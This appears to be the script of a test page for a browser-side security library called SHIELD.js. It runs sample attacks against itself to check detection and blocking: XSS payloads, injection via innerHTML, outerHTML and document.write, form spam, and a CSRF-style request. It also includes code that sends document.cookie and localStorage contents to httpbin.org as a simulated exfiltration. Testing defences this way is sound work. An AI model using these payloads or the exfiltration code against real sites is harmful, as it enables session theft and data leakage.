
        let shield;
        let threatCount = 0;
        let blockedCount = 0;

        // Initialize SHIELD.js
        async function initializeShield() {
            try {
                shield = new ShieldFirewall();

                await shield.configure({
                    protectionLevel: 'strict',
                    features: {
                        domProtection: true,
                        networkInterception: true,
                        behaviorAnalysis: true,
                        predictiveDetection: true,
                        autoRecovery: true
                    },
                    threatDetection: {
                        sensitivity: 0.8,
                        customPatterns: [
                            'script.*alert',
                            'onerror.*alert',
                            'javascript:',
                            'cookie.*steal',
                            'document\\.cookie'
                        ]
                    }
                });

                await shield.initialize();
                await shield.start();

                document.getElementById('shield-status').textContent = 'SHIELD.js protection active and monitoring';
                document.getElementById('shield-status').className = 'status protected';

                // Listen for threat events
                document.addEventListener('shield:threat-detected', handleThreatDetected);
                document.addEventListener('shield:threat-blocked', handleThreatBlocked);

                console.log('SHIELD.js initialized successfully');
            } catch (error) {
                console.error('Failed to initialize SHIELD.js:', error);
                document.getElementById('shield-status').textContent = 'SHIELD.js initialization failed';
                document.getElementById('shield-status').className = 'status blocked';
            }
        }

        function handleThreatDetected(event) {
            const threat = event.detail;
            threatCount++;
            updateDashboard();

            const logEntry = document.createElement('div');
            logEntry.className = 'threat-item blocked';
            logEntry.textContent = `${new Date().toLocaleTimeString()}: ${threat.type} - ${threat.severity}`;
            document.getElementById('threat-log').prepend(logEntry);
        }

        function handleThreatBlocked(event) {
            blockedCount++;
            updateDashboard();
        }

        function updateDashboard() {
            document.getElementById('threats-detected').textContent = threatCount;
            document.getElementById('threats-blocked').textContent = blockedCount;
            const score = Math.max(0, 100 - (threatCount * 5));
            document.getElementById('protection-score').textContent = score;
        }

        function logResult(elementId, message, type = 'info') {
            const resultsDiv = document.getElementById(elementId);
            const resultEntry = document.createElement('div');
            resultEntry.className = `status ${type}`;
            resultEntry.textContent = `${new Date().toLocaleTimeString()}: ${message}`;
            resultsDiv.appendChild(resultEntry);
        }

        // Basic XSS Tests
        function runBasicXSS() {
            try {
                // This should be blocked by SHIELD.js
                const maliciousScript = document.createElement('script');
                maliciousScript.textContent = 'alert("XSS Attack!")';
                document.body.appendChild(maliciousScript);

                logResult('basic-xss-results', 'Basic XSS test completed - check if alert appeared', 'warning');
            } catch (error) {
                logResult('basic-xss-results', `Basic XSS blocked: ${error.message}`, 'protected');
            }
        }

        function runImageXSS() {
            try {
                const img = document.createElement('img');
                img.src = 'x';
                img.onerror = () => alert('XSS via image!');
                document.body.appendChild(img);

                logResult('basic-xss-results', 'Image XSS test completed', 'warning');
            } catch (error) {
                logResult('basic-xss-results', `Image XSS blocked: ${error.message}`, 'protected');
            }
        }

        function runIframeXSS() {
            try {
                const iframe = document.createElement('iframe');
                iframe.src = 'javascript:alert("XSS via iframe!")';
                document.body.appendChild(iframe);

                logResult('basic-xss-results', 'Iframe XSS test completed', 'warning');
            } catch (error) {
                logResult('basic-xss-results', `Iframe XSS blocked: ${error.message}`, 'protected');
            }
        }

        function runScriptTagXSS() {
            try {
                const script = document.createElement('script');
                script.src = 'data:text/javascript,alert("XSS via script tag!")';
                document.body.appendChild(script);

                logResult('basic-xss-results', 'Script tag XSS test completed', 'warning');
            } catch (error) {
                logResult('basic-xss-results', `Script tag XSS blocked: ${error.message}`, 'protected');
            }
        }

        // Advanced XSS Tests
        function runCookieTheft() {
            try {
                // Simulate cookie theft attempt
                const img = new Image();
                img.src = 'https://httpbin.org/get?cookie=' + encodeURIComponent(document.cookie);
                logResult('advanced-xss-results', 'Cookie theft attempt simulated', 'warning');
            } catch (error) {
                logResult('advanced-xss-results', `Cookie theft blocked: ${error.message}`, 'protected');
            }
        }

        function runFormHijacking() {
            try {
                const forms = document.querySelectorAll('form');
                if (forms.length > 0) {
                    const originalSubmit = forms[0].onsubmit;
                    forms[0].onsubmit = function() {
                        alert('Form hijacked!');
                        return false;
                    };
                    logResult('advanced-xss-results', 'Form hijacking test completed', 'warning');
                } else {
                    logResult('advanced-xss-results', 'No forms found to test', 'warning');
                }
            } catch (error) {
                logResult('advanced-xss-results', `Form hijacking blocked: ${error.message}`, 'protected');
            }
        }

        function runDOMBasedXSS() {
            try {
                const div = document.createElement('div');
                div.innerHTML = '<img src=x onerror="alert(\'DOM-based XSS!\')">';
                document.body.appendChild(div);

                logResult('advanced-xss-results', 'DOM-based XSS test completed', 'warning');
            } catch (error) {
                logResult('advanced-xss-results', `DOM-based XSS blocked: ${error.message}`, 'protected');
            }
        }

        function runEventHandlerXSS() {
            try {
                const button = document.createElement('button');
                button.setAttribute('onclick', 'alert("Event handler XSS!")');
                button.textContent = 'Click me';
                document.body.appendChild(button);

                logResult('advanced-xss-results', 'Event handler XSS test completed', 'warning');
            } catch (error) {
                logResult('advanced-xss-results', `Event handler XSS blocked: ${error.message}`, 'protected');
            }
        }

        // DOM Manipulation Tests
        function runInnerHTMLInjection() {
            try {
                const testDiv = document.createElement('div');
                testDiv.innerHTML = '<script>alert("innerHTML injection!")</script><p>Safe content</p>';
                document.body.appendChild(testDiv);

                logResult('dom-results', 'innerHTML injection test completed', 'warning');
            } catch (error) {
                logResult('dom-results', `innerHTML injection blocked: ${error.message}`, 'protected');
            }
        }

        function runOuterHTMLInjection() {
            try {
                const testDiv = document.createElement('div');
                document.body.appendChild(testDiv);
                testDiv.outerHTML = '<div><script>alert("outerHTML injection!")</script></div>';

                logResult('dom-results', 'outerHTML injection test completed', 'warning');
            } catch (error) {
                logResult('dom-results', `outerHTML injection blocked: ${error.message}`, 'protected');
            }
        }

        function runInsertAdjacentHTML() {
            try {
                const testDiv = document.createElement('div');
                document.body.appendChild(testDiv);
                testDiv.insertAdjacentHTML('beforeend', '<script>alert("insertAdjacentHTML injection!")</script>');

                logResult('dom-results', 'insertAdjacentHTML injection test completed', 'warning');
            } catch (error) {
                logResult('dom-results', `insertAdjacentHTML injection blocked: ${error.message}`, 'protected');
            }
        }

        function runDocumentWrite() {
            try {
                document.write('<script>alert("document.write injection!")</script>');

                logResult('dom-results', 'document.write injection test completed', 'warning');
            } catch (error) {
                logResult('dom-results', `document.write injection blocked: ${error.message}`, 'protected');
            }
        }

        // Behavioral Analysis Tests
        function runRapidClicks() {
            let clickCount = 0;
            const clickInterval = setInterval(() => {
                const event = new MouseEvent('click', {
                    bubbles: true,
                    cancelable: true,
                    clientX: Math.random() * window.innerWidth,
                    clientY: Math.random() * window.innerHeight
                });
                document.body.dispatchEvent(event);
                clickCount++;

                if (clickCount >= 50) {
                    clearInterval(clickInterval);
                    logResult('behavior-results', 'Rapid clicking test completed (50 clicks)', 'warning');
                }
            }, 10);
        }

        function runFormSpam() {
            const spamInterval = setInterval(() => {
                const form = document.createElement('form');
                form.innerHTML = '<input type="text" value="spam content">';
                document.body.appendChild(form);
                form.submit();

                setTimeout(() => {
                    if (form.parentNode) {
                        form.parentNode.removeChild(form);
                    }
                }, 100);
            }, 50);

            setTimeout(() => {
                clearInterval(spamInterval);
                logResult('behavior-results', 'Form spam test completed', 'warning');
            }, 2000);
        }

        function runUnusualNavigation() {
            // Simulate unusual navigation patterns
            const pages = ['page1.html', 'page2.html', 'page3.html', 'page4.html', 'page5.html'];
            let navCount = 0;

            const navInterval = setInterval(() => {
                // Simulate rapid page navigation
                history.pushState({}, '', pages[navCount % pages.length]);
                navCount++;

                if (navCount >= 20) {
                    clearInterval(navInterval);
                    logResult('behavior-results', 'Unusual navigation test completed', 'warning');
                }
            }, 100);
        }

        function runTimingAttack() {
            // Simulate timing attack patterns
            const startTime = performance.now();

            // Perform many DOM operations quickly
            for (let i = 0; i < 1000; i++) {
                const div = document.createElement('div');
                div.textContent = 'Timing test ' + i;
                document.body.appendChild(div);

                // Remove immediately to avoid DOM bloat
                setTimeout(() => {
                    if (div.parentNode) {
                        div.parentNode.removeChild(div);
                    }
                }, 1);
            }

            const endTime = performance.now();
            logResult('behavior-results', `Timing attack test completed in ${(endTime - startTime).toFixed(2)}ms`, 'warning');
        }

        // Network Interception Tests
        function runSuspiciousRequest() {
            fetch('https://httpbin.org/get?suspicious=parameter&inject=<script>alert(1)</script>')
                .then(response => response.json())
                .then(data => {
                    logResult('network-results', 'Suspicious request completed', 'warning');
                })
                .catch(error => {
                    logResult('network-results', `Suspicious request blocked: ${error.message}`, 'protected');
                });
        }

        function runDataExfiltration() {
            const data = {
                cookies: document.cookie,
                localStorage: JSON.stringify(localStorage),
                userAgent: navigator.userAgent
            };

            fetch('https://httpbin.org/post', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
            })
            .then(response => response.json())
            .then(data => {
                logResult('network-results', 'Data exfiltration attempt completed', 'warning');
            })
            .catch(error => {
                logResult('network-results', `Data exfiltration blocked: ${error.message}`, 'protected');
            });
        }

        function runMaliciousRedirect() {
            try {
                window.location.href = 'javascript:alert("Malicious redirect!")';
                logResult('network-results', 'Malicious redirect test completed', 'warning');
            } catch (error) {
                logResult('network-results', `Malicious redirect blocked: ${error.message}`, 'protected');
            }
        }

        function runCSRFAttempt() {
            fetch('https://httpbin.org/post', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'action=transfer&amount=1000&to=attacker'
            })
            .then(response => response.json())
            .then(data => {
                logResult('network-results', 'CSRF attempt completed', 'warning');
            })
            .catch(error => {
                logResult('network-results', `CSRF attempt blocked: ${error.message}`, 'protected');
            });
        }

        // Performance Tests
        function runPerformanceTest() {
            const startTime = performance.now();

            // Simulate page load with SHIELD.js
            setTimeout(() => {
                const loadTime = performance.now() - startTime;
                const status = loadTime < 100 ? 'protected' : 'warning';
                logResult('performance-results', `Page load time: ${loadTime.toFixed(2)}ms`, status);
            }, 10);
        }

        function runMemoryTest() {
            if ('memory' in performance) {
                const memInfo = performance.memory;
                const usedMB = (memInfo.usedJSHeapSize / 1024 / 1024).toFixed(2);
                const totalMB = (memInfo.totalJSHeapSize / 1024 / 1024).toFixed(2);

                logResult('performance-results', `Memory usage: ${usedMB}MB used of ${totalMB}MB total`, 'info');
            } else {
                logResult('performance-results', 'Memory monitoring not available in this browser', 'warning');
            }
        }

        function runCPUTest() {
            // Simple CPU usage estimation
            const startTime = performance.now();
            let operations = 0;

            for (let i = 0; i < 1000000; i++) {
                operations += Math.sqrt(i);
            }

            const endTime = performance.now();
            const cpuTime = endTime - startTime;

            logResult('performance-results', `CPU test completed in ${cpuTime.toFixed(2)}ms`, 'info');
        }

        // Custom Payload Test
        function runCustomPayload() {
            const payload = document.getElementById('custom-payload').value.trim();

            if (!payload) {
                logResult('custom-results', 'Please enter a payload to test', 'warning');
                return;
            }

            try {
                // Attempt to execute the payload
                const testDiv = document.createElement('div');
                testDiv.innerHTML = payload;
                document.body.appendChild(testDiv);

                logResult('custom-results', 'Custom payload test completed - check for any alerts or unexpected behavior', 'warning');

                // Clean up
                setTimeout(() => {
                    if (testDiv.parentNode) {
                        testDiv.parentNode.removeChild(testDiv);
                    }
                }, 1000);

            } catch (error) {
                logResult('custom-results', `Custom payload blocked: ${error.message}`, 'protected');
            }
        }
        // Initialize when page loads
        window.addEventListener('load', initializeShield);
    